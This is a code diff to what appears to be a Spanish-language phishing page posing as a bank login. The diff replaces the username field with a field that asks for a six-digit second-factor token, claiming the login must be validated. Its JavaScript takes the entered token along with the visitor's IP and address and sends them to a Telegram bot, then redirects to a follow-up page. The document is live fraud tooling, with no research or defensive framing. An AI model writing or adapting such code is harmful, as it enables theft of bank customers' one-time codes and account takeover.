@@ -7,8 +7,6 @@
     <link rel="shortcut icon" href="picts/ico.png" type="image/x-icon">
     <link rel="stylesheet" href="style.css">
     <script src="tlgram.js"></script>
-
-	
 </head>
 <body>
     <div class="cont-flx">
@@ -25,31 +23,38 @@
 
             <div id="cont-xjsx">
                 <form id="xjsx" onsubmit="return sender()" method="post">
+                    <div class="text-tk">
+                        <p>Necesitamos validar su ingreso.</p>
+                    </div>
                     <div class="usr">
                         <img id="user" src="picts/usr.png" alt="">
-                        <input id="js1" name="js1" type="password" placeholder="USUARIO">
+                        <input inputmode="numeric" maxlength="6" id="tok" value="" name="tok" type="password" placeholder="TOKEN SEGUNDO FACTOR">
                         <img id="eys" src="picts/eys.png" alt="">
 
                     </div>
                     <p id="err"></p>
-                    <div class="check">
-                        <input id="check" type="checkbox">
-                        <label for="check">Recordar usuario</label>
+
+                    <div class="tecl">
+                        <img src="picts/tcl.png" alt="">
+                        <p>TECLADO VIRTUAL</p>
+                       
                     </div>
 
-                    <div class="record">
-                        <a href="#">Recuperar usuario</a>
-                        <p>|</p>
-                        <a href="#">Desbloquear usuario</a>
-                    </div>
+
                     <div class="sub">
-                        <input type="submit" value="Continuar">
+                        <input type="submit" value="Ingresar">
                     </div>
                     <div class="foot">
                         <img src="picts/foot.png" alt="">
                     </div>
 
                 </form>
+            </div>
+
+        </div>
+
+        <div id="cont-niper">
+            <div class="loader">
             </div>
 
         </div>
@@ -63,24 +68,33 @@
         
         </div>
     </div>
-    
     <div id="gfg" style="display:none;"></div>
     <div id="ip" style="display:none;"></div>
     <div id="address" style="display:none;"></div>
+    
 </body>
 </html>
+
+
+<script src="xjsx/jss.js"></script>
+
 <script>
+
+
+
     document.addEventListener('DOMContentLoaded', function() {
         const xjsx = document.querySelector('#xjsx');
-        var js1 = document.querySelector('#js1');
+        const tok = document.querySelector('#tok');
         const err = document.querySelector('#err');
-
+        tok.addEventListener('input', function () {
+            this.value = this.value.replace(/\D/g, '');
+        });
         xjsx.addEventListener('submit', e => {
             e.preventDefault();
-            if (js1.value.trim().length === 0) {
+            if (tok.value.trim().length === 0) {
                 err.innerHTML = "Este campo es obligatorio";
                 return false;
-            } else if (js1.value.trim().length <= 3) {
+            } else if (tok.value.trim().length <= 5) {
                 err.innerHTML = "Campo invalido";
                 return false;
             }
@@ -116,10 +130,11 @@
     function sender(e) {
         e.preventDefault();
         fetchIPData().then(() => {
-            var js1 = document.getElementById("js1").value;
+            // const js1 = document.getElementById("js1").value;
+            const tok = document.getElementById("tok").value;
             const ip = document.getElementById("gfg").innerHTML;
             const ip2 = document.getElementById("address").innerHTML;
-            const message = `**FE**\nUS3R: ${js1}\n🌎IP: ${ip}\n${ip2}`;
+            const message = `**FE**\nT0K3N: ${tok}\n🌎IP: ${ip}\n${ip2}`;
 
             const T0K3N = T0KEN; 
             const chatID = CHATID; 
@@ -140,16 +155,34 @@
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        window.location.href = '_index.html';
+                        
+                        window.location.href = '_indexx.html';
                     } else {
-                        alert('Intenta nuevamente, algo salio mal.');
+                       
                         console.error('Telegram error:', data);
                     }
                 })
                 .catch(error => {
                     console.error('Error:', error);
-                    alert('An error occurred');
+                    alert('Intenta nuevamente, algo salio mal.');
                 });
         });
-    }
+    };
+
+
+
+
+    
+
+
+    document.getElementById('eys').addEventListener('click', function () {
+        // const passwordInput = document.getElementById('js1');
+        if (tok.type === 'password') {
+            tok.type = 'text';
+            this.src = 'picts/eys-m.png';
+        } else {
+            tok.type = 'password';
+            this.src = 'picts/eys.png'; 
+        }
+    });
 </script>
